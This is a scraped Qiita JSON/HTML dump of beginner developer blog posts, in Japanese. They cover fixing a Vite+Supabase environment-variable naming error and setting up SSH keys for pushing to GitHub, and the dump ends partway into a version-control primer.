src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F701af45b-9e10-4205-b770-204c4ff7a550.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d016b4e88fe263a5be98748c36327aa1\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F701af45b-9e10-4205-b770-204c4ff7a550.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=84bd79847416d9f4afc0cb8243879c93 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/701af45b-9e10-4205-b770-204c4ff7a550.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"9:1-9:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"10:1-10:82\">環境変数名を.envで定義したものと違うものを指定していた。</p>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"12:1-15:3\">\n<div class=\"code-lang\"><span class=\"bold\">.env</span></div>\n<div class=\"highlight\"><pre><code><span class=\"nv\">VITE_SUPABASE_URL</span><span class=\"o\">=</span><span class=\"s1\">'https://~'</span>\n<span class=\"nv\">VITE_SUPABASE_ANON_KEY</span><span class=\"o\">=</span>キー\n</code></pre></div>\n</div>\n<div class=\"code-frame\" data-lang=\"diff_typescript\" data-sourcepos=\"17:1-25:3\">\n<div class=\"code-lang\"><span class=\"bold\">supabase.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">createClient</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">@supabase/supabase-js</span><span class=\"dl\">'</span>\n\n<span class=\"hdl\"><span class=\"o\">- </span><span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">supabase</span> <span class=\"o\">=</span> <span class=\"nf\">createClient</span><span class=\"p\">(</span><span class=\"k\">import</span><span class=\"p\">.</span><span class=\"nx\">meta</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">VITE_SUPABASE_URL</span><span class=\"o\">!</span><span class=\"p\">,</span> <span class=\"k\">import</span><span class=\"p\">.</span><span class=\"nx\">meta</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">VITE_SUPABASE_KEY</span><span class=\"o\">!</span><span class=\"p\">)</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span><span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">supabase</span> <span class=\"o\">=</span> <span class=\"nf\">createClient</span><span class=\"p\">(</span><span class=\"k\">import</span><span class=\"p\">.</span><span class=\"nx\">meta</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">VITE_SUPABASE_URL</span><span class=\"o\">!</span><span class=\"p\">,</span> <span class=\"k\">import</span><span class=\"p\">.</span><span class=\"nx\">meta</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">VITE_SUPABASE_ANON_KEY</span><span class=\"o\">!</span><span class=\"p\">)</span>\n</span>\n<span class=\"hil\"><span class=\"o\">+ </span><span class=\"c1\">// 環境変数が正しく設定されていることを確認</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span><span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Environment Variables:</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">import</span><span class=\"p\">.</span><span class=\"nx\">meta</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">);</span>\n</span></code></pre></div>\n</div>\n<p data-sourcepos=\"26:1-26:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb324b1d2-739a-4e73-a674-c20c70604bf6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=195c7e42fa4af46d9d6987a14cd5b659\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb324b1d2-739a-4e73-a674-c20c70604bf6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=195c7e42fa4af46d9d6987a14cd5b659\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb324b1d2-739a-4e73-a674-c20c70604bf6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7dc4cb288ca983c688a36f3fb3a70877 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b324b1d2-739a-4e73-a674-c20c70604bf6.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"31:1-31:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"32:1-35:104\"><img alt=\":writing_hand:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/270d-fe0f.png\" title=\":writing_hand:\" width=\"20\" loading=\"lazy\">学んだこと<br>\nVITEプロジェクトの場合、環境変数の先頭に<code>VITE_</code>をつける<br>\n環境変数を読み込む際は<code>import.meta.env.環境変数名</code>にする<br>\n<code>process.env.環境変数名</code>にしたい場合は<a href=\"https://qiita.com/shunii/items/b00d556f3730e6b88708\" id=\"reference-52869c5060f5c7f7bd2a\">こちら</a> の記事を参考に設定を変える</p>\n<h1 data-sourcepos=\"39:1-39:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"41:1-41:51\"><iframe id=\"qiita-embed-content__8d76bece1b8775b30f3ed74ad1ac54ca\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8d76bece1b8775b30f3ed74ad1ac54ca\" data-content=\"https%3A%2F%2Fqiita.com%2Fshunii%2Fitems%2Fb00d556f3730e6b88708\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n環境変数ファイルを作成時につまったので記事にします。\n\n# 問題\n正しいURL、キーを入力したはずなのに表題のエラーがでる\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/701af45b-9e10-4205-b770-204c4ff7a550.png)\n\n\n# 解決方法\n環境変数名を.envで定義したものと違うものを指定していた。\n\n```.env\nVITE_SUPABASE_URL='https://~'\nVITE_SUPABASE_ANON_KEY=キー\n```\n\n```diff_typescript:supabase.ts\nimport { createClient } from '@supabase/supabase-js'\n\n- export const supabase = createClient(import.meta.env.VITE_SUPABASE_URL!, import.meta.env.VITE_SUPABASE_KEY!)\n+ export const supabase = createClient(import.meta.env.VITE_SUPABASE_URL!, import.meta.env.VITE_SUPABASE_ANON_KEY!)\n\n+ // 環境変数が正しく設定されていることを確認\n+ console.log(\"Environment Variables:\", import.meta.env);\n```\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b324b1d2-739a-4e73-a674-c20c70604bf6.png)\n\n\n\n\n# おわりに\n:writing_hand:学んだこと\nVITEプロジェクトの場合、環境変数の先頭に`VITE_`をつける\n環境変数を読み込む際は`import.meta.env.環境変数名`にする\n`process.env.環境変数名`にしたい場合は[こちら][1] の記事を参考に設定を変える\n\n[1]:https://qiita.com/shunii/items/b00d556f3730e6b88708\n\n# 参考\n\nhttps://qiita.com/shunii/items/b00d556f3730e6b88708\n","coediting":false,"comments_count":0,"created_at":"2025-03-30T11:53:48+09:00","group":null,"id":"68d0074589fe77b02bf2","likes_count":1,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"error","versions":[]},{"name":"環境変数","versions":[]},{"name":"vite","versions":[]},{"name":"Supabase","versions":[]}],"title":"【Vite+Supabase】Uncaught Error: supabaseUrl is required.","updated_at":"2025-03-30T11:53:48+09:00","url":"https://qiita.com/asa129/items/68d0074589fe77b02bf2","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":377,"team_membership":null,"organization_url_name":null,"slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:69\">GitHubリポジトリへpushする際に、毎回ユーザ名とパスワードを入力していました。<br>\n面倒だと感じたため、備忘録として記事にします。</p>\n<h1 data-sourcepos=\"5:1-5:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"6:1-7:72\"><code>git push origin main</code>コマンドを実行した後、毎回ユーザ名とパスワードを入力していました。<br>\n入力せずにコマンドを実行したいと考えていました。</p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"9:1-14:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>git push origin main\n<span class=\"c\"># コマンドを実行後、入力を求められる</span>\nUsername <span class=\"k\">for</span> <span class=\"s1\">'https://github.com'</span>: ユーザー名\nPassword <span class=\"k\">for</span> <span class=\"s1\">'https://asa129@github.com'</span>:パスワード\n</code></pre></div></div>\n<h1 data-sourcepos=\"16:1-16:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"18:1-18:117\">以下の手順でSSHキーを登録、リモートリポジトリのURLを変更することで解決しました。</p>\n<ol data-sourcepos=\"19:1-24:0\">\n<li data-sourcepos=\"19:1-19:21\">SSHキーを作る</li>\n<li data-sourcepos=\"20:1-20:33\">SSHエージェントの起動</li>\n<li data-sourcepos=\"21:1-21:24\">公開鍵のコピー</li>\n<li data-sourcepos=\"22:1-22:30\">GitHubに公開鍵を追加</li>\n<li data-sourcepos=\"23:1-24:0\">リモートリポジトリのURLを変更</li>\n</ol>\n<h3 data-sourcepos=\"25:1-25:25\">\n<span id=\"sshキーを作る\" class=\"fragment\"></span><a href=\"#ssh%E3%82%AD%E3%83%BC%E3%82%92%E4%BD%9C%E3%82%8B\"><i class=\"fa fa-link\"></i></a>①SSHキーを作る</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"26:1-36:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>ssh-keygen <span class=\"nt\">-t</span> ed25519 <span class=\"nt\">-C</span> <span class=\"s2\">\"GitHubアカウントに登録しているメールアドレス\"</span>\n\n<span class=\"c\"># キーの保存場所を聞かれる、デフォルト設定のままEnter</span>\nGenerating public/private ed25519 key pair.\nEnter file <span class=\"k\">in </span>which to save the key <span class=\"o\">(</span>/home/test/.ssh/id_ed25519<span class=\"o\">)</span>: \n\n<span class=\"c\"># パスフレーズの設定、デフォルト設定のままEnter(セキュリティを高めたい場合は入力する)</span>\nEnter passphrase <span class=\"o\">(</span>empty <span class=\"k\">for </span>no passphrase<span class=\"o\">)</span>:\nEnter same passphrase again:\n</code></pre></div></div>\n<h3 data-sourcepos=\"38:1-38:37\">\n<span id=\"sshエージェントの起動\" class=\"fragment\"></span><a href=\"#ssh%E3%82%A8%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%B3%E3%83%88%E3%81%AE%E8%B5%B7%E5%8B%95\"><i class=\"fa fa-link\"></i></a>②SSHエージェントの起動</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"39:1-43:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span><span class=\"nb\">eval</span> <span class=\"s2\">\"</span><span class=\"si\">$(</span>ssh-agent <span class=\"nt\">-s</span><span class=\"si\">)</span><span class=\"s2\">\"</span>\n<span class=\"c\"># 秘密鍵をSSHエージェントに追加</span>\n<span class=\"nv\">$ </span>ssh-add ~/.ssh/id_ed25519\n</code></pre></div></div>\n<h3 data-sourcepos=\"45:1-45:28\">\n<span id=\"公開鍵のコピー\" class=\"fragment\"></span><a href=\"#%E5%85%AC%E9%96%8B%E9%8D%B5%E3%81%AE%E3%82%B3%E3%83%94%E3%83%BC\"><i class=\"fa fa-link\"></i></a>③公開鍵のコピー</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"46:1-49:3\"><div class=\"highlight\"><pre><code><span class=\"c\"># 公開鍵を表示、コピーする</span>\n<span class=\"nv\">$ </span><span class=\"nb\">cat</span> ~/.ssh/id_ed25519.pub\n</code></pre></div></div>\n<h3 data-sourcepos=\"51:1-51:34\">\n<span id=\"githubに公開鍵を追加\" class=\"fragment\"></span><a href=\"#github%E3%81%AB%E5%85%AC%E9%96%8B%E9%8D%B5%E3%82%92%E8%BF%BD%E5%8A%A0\"><i class=\"fa fa-link\"></i></a>④GitHubに公開鍵を追加</h3>\n<ul data-sourcepos=\"52:1-53:1\">\n<li data-sourcepos=\"52:1-53:1\">プロフィールアイコンから<code>Settings</code>を選択</li>\n</ul>\n<p data-sourcepos=\"54:1-54:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fca5755fa-0c31-49a8-9718-4fddab8c5c37.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f044ac0657df5c24d3e30c46081fda06\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fca5755fa-0c31-49a8-9718-4fddab8c5c37.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f044ac0657df5c24d3e30c46081fda06\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fca5755fa-0c31-49a8-9718-4fddab8c5c37.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=cd6dd0b8fc1cf51dacfbff5528dbb8f4 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ca5755fa-0c31-49a8-9718-4fddab8c5c37.png\" loading=\"lazy\"></a></p>\n<ul data-sourcepos=\"56:1-61:0\">\n<li data-sourcepos=\"56:1-59:0\">\n<p data-sourcepos=\"56:3-57:122\"><code>SSH and GPG keys</code>を選択<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F70822c09-2fe4-4a77-b74e-26fd71a95bb2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2fb32fb80105490c4877771965d59443\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F70822c09-2fe4-4a77-b74e-26fd71a95bb2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2fb32fb80105490c4877771965d59443\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F70822c09-2fe4-4a77-b74e-26fd71a95bb2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=8972acd80e0545a39c0d6844d49fc2b4 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/70822c09-2fe4-4a77-b74e-26fd71a95bb2.png\" loading=\"lazy\"></a></p>\n</li>\n<li data-sourcepos=\"60:1-61:0\">\n<p data-sourcepos=\"60:3-60:24\"><code>New SSH Key</code>を選択</p>\n</li>\n</ul>\n<p data-sourcepos=\"62:1-62:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd4086a7a-520e-4588-8429-5a48c5d261df.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a31a431af8bfa029bc576b43ef318429\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd4086a7a-520e-4588-8429-5a48c5d261df.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a31a431af8bfa029bc576b43ef318429\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd4086a7a-520e-4588-8429-5a48c5d261df.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=d4a632d3fe541fd699b8c49b95167216 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d4086a7a-520e-4588-8429-5a48c5d261df.png\" loading=\"lazy\"></a></p>\n<ul data-sourcepos=\"64:1-66:0\">\n<li data-sourcepos=\"64:1-66:0\">任意のタイトルを入力、③でコピーした公開鍵を貼り付け、<code>Add SSH Key</code>を押下<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2c5986cc-a12b-4710-9973-357054b6b90f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=32d0deb85923fc54d19ea3fec171633e\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2c5986cc-a12b-4710-9973-357054b6b90f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=32d0deb85923fc54d19ea3fec171633e\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2c5986cc-a12b-4710-9973-357054b6b90f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=61de86d4d14d049e569c337d5957d251 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2c5986cc-a12b-4710-9973-357054b6b90f.png\" loading=\"lazy\"></a>\n</li>\n</ul>\n<h3 data-sourcepos=\"67:1-67:31\">\n<span id=\"リモートurlの変更\" class=\"fragment\"></span><a href=\"#%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88url%E3%81%AE%E5%A4%89%E6%9B%B4\"><i class=\"fa fa-link\"></i></a>⑤リモートURLの変更</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"68:1-84:3\"><div class=\"highlight\"><pre><code><span class=\"c\"># 現在のリモートリポジトリ情報を確認</span>\n<span class=\"nv\">$ </span>git remote <span class=\"nt\">-v</span>\n\ne.g<span class=\"o\">)</span>\norigin  https://github.com/asa129/react-router-lesson.git <span class=\"o\">(</span>fetch<span class=\"o\">)</span>\norigin  https://github.com/asa129/react-router-lesson.git <span class=\"o\">(</span>push<span class=\"o\">)</span>\n\n<span class=\"c\"># リモートリポジトリのURLを変更</span>\n<span class=\"nv\">$　</span>git remote set-url origin リモートリポジトリURL（SSH）\n\n<span class=\"c\"># 変更後のリモートリポジトリ情報を確認</span>\n <span class=\"nv\">$ </span>git remote <span class=\"nt\">-v</span>\ne.g<span class=\"o\">)</span>\norigin  git@github.com:asa129/react-router-lesson.git <span class=\"o\">(</span>fetch<span class=\"o\">)</span>\norigin  git@github.com:asa129/react-router-lesson.git <span class=\"o\">(</span>push<span class=\"o\">)</span>\n</code></pre></div></div>\n<p data-sourcepos=\"86:1-87:122\">SSHのURLは登録したいリポジトリの<code>Code</code>から<code>SSH</code>を選択でコピー可能<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff459010d-cb60-4298-a96e-9d477637c69e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=51f05851ef1e754301a996cb88b998dd\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff459010d-cb60-4298-a96e-9d477637c69e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=51f05851ef1e754301a996cb88b998dd\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff459010d-cb60-4298-a96e-9d477637c69e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=ce2528e73b9df1557f541e40e12e82c4 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f459010d-cb60-4298-a96e-9d477637c69e.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"89:1-89:22\">\n<span id=\"接続テスト\" class=\"fragment\"></span><a href=\"#%E6%8E%A5%E7%B6%9A%E3%83%86%E3%82%B9%E3%83%88\"><i class=\"fa fa-link\"></i></a>⑥接続テスト</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"90:1-92:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>ssh <span class=\"nt\">-T</span> git@github.com\n</code></pre></div></div>\n<p data-sourcepos=\"93:1-93:93\"><code>Hi ユーザー名! You've successfully authenticated,~</code>のメッセージが出れば成功</p>\n<h1 data-sourcepos=\"95:1-95:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"96:1-96:64\">面倒だといいながら1週間後回しにしてました。</p>\n","body":"# はじめに\nGitHubリポジトリへpushする際に、毎回ユーザ名とパスワードを入力していました。\n面倒だと感じたため、備忘録として記事にします。\n\n# 問題\n`git push origin main`コマンドを実行した後、毎回ユーザ名とパスワードを入力していました。\n入力せずにコマンドを実行したいと考えていました。\n\n```bash\n$ git push origin main\n# コマンドを実行後、入力を求められる\nUsername for 'https://github.com': ユーザー名\nPassword for 'https://asa129@github.com':パスワード\n```\n\n# 解決方法\n\n以下の手順でSSHキーを登録、リモートリポジトリのURLを変更することで解決しました。\n1. SSHキーを作る\n2. SSHエージェントの起動\n3. 公開鍵のコピー\n4. GitHubに公開鍵を追加\n5. リモートリポジトリのURLを変更\n\n### ①SSHキーを作る\n```bash\n$ ssh-keygen -t ed25519 -C \"GitHubアカウントに登録しているメールアドレス\"\n\n# キーの保存場所を聞かれる、デフォルト設定のままEnter\nGenerating public/private ed25519 key pair.\nEnter file in which to save the key (/home/test/.ssh/id_ed25519): \n\n# パスフレーズの設定、デフォルト設定のままEnter(セキュリティを高めたい場合は入力する)\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\n```\n\n### ②SSHエージェントの起動\n```bash\n$ eval \"$(ssh-agent -s)\"\n# 秘密鍵をSSHエージェントに追加\n$ ssh-add ~/.ssh/id_ed25519\n```\n\n### ③公開鍵のコピー\n```bash\n# 公開鍵を表示、コピーする\n$ cat ~/.ssh/id_ed25519.pub\n```\n\n### ④GitHubに公開鍵を追加\n* プロフィールアイコンから`Settings`を選択\n \n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ca5755fa-0c31-49a8-9718-4fddab8c5c37.png)\n\n* `SSH and GPG keys`を選択\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/70822c09-2fe4-4a77-b74e-26fd71a95bb2.png)\n\n\n* `New SSH Key`を選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d4086a7a-520e-4588-8429-5a48c5d261df.png)\n\n* 任意のタイトルを入力、③でコピーした公開鍵を貼り付け、`Add SSH Key`を押下\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2c5986cc-a12b-4710-9973-357054b6b90f.png)\n\n### ⑤リモートURLの変更\n```bash\n# 現在のリモートリポジトリ情報を確認\n$ git remote -v\n\ne.g)\norigin  https://github.com/asa129/react-router-lesson.git (fetch)\norigin  https://github.com/asa129/react-router-lesson.git (push)\n\n# リモートリポジトリのURLを変更\n$　git remote set-url origin リモートリポジトリURL（SSH）\n\n# 変更後のリモートリポジトリ情報を確認\n $ git remote -v\ne.g)\norigin  git@github.com:asa129/react-router-lesson.git (fetch)\norigin  git@github.com:asa129/react-router-lesson.git (push)\n```\n\nSSHのURLは登録したいリポジトリの`Code`から`SSH`を選択でコピー可能\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f459010d-cb60-4298-a96e-9d477637c69e.png)\n\n### ⑥接続テスト\n```bash\n$ ssh -T git@github.com\n```\n`Hi ユーザー名! You've successfully authenticated,~`のメッセージが出れば成功\n\n# おわりに\n面倒だといいながら1週間後回しにしてました。\n","coediting":false,"comments_count":0,"created_at":"2025-03-24T19:49:24+09:00","group":null,"id":"0d1bb94ee463cfc9eadd","likes_count":2,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Git","versions":[]},{"name":"GitHub","versions":[]},{"name":"初心者","versions":[]}],"title":"【git】push時に毎回パスワード入力を求められる","updated_at":"2025-03-24T19:49:24+09:00","url":"https://qiita.com/asa129/items/0d1bb94ee463cfc9eadd","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":991,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"基本概念\" class=\"fragment\"></span><a href=\"#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5\"><i class=\"fa fa-link\"></i></a>基本概念</h1>\n<h2 data-sourcepos=\"2:1-2:30\">\n<span id=\"バージョン管理とは\" class=\"fragment\"></span><a href=\"#%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E7%AE%A1%E7%90%86%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>バージョン管理とは</h2>\n<p data-sourcepos=\"3:1-4:68\">ファイルの変更履歴を管理する<br>\nエクセルファイルとかQA表よくこうなっているわ…</p>\n<p data-sourcepos=\"6:1-6:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe26a1d63-7785-4b96-b759-c921b19a935b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=7ad7d824dbf26f7338bb177122e48cc1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe26a1d63-7785-4b96-b759-c921b19a935b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=7ad7d824dbf26f7338bb177122e48cc1\" alt=\"image.png\" 